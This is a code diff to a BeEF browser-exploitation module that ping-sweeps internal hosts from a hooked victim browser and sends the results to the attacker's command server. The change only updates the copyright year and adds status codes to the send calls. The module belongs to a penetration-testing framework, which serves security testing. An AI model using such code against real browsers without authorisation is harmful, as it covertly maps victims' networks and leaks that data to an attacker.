@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - http://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -28,11 +28,11 @@ beef.execute(function() {
                     output = document.pingSweep.getAliveHosts();
                     clearTimeout(int_timeout);
                     clearTimeout(ext_timeout);
-				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"));
+				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"), beef.are.status_success());
 				    beef.dom.detachApplet('pingSweep');
 				    return;
                 }else{
-                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check');
+                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check', beef.are.status_error());
                      return;
                 }
 			} catch (e) {
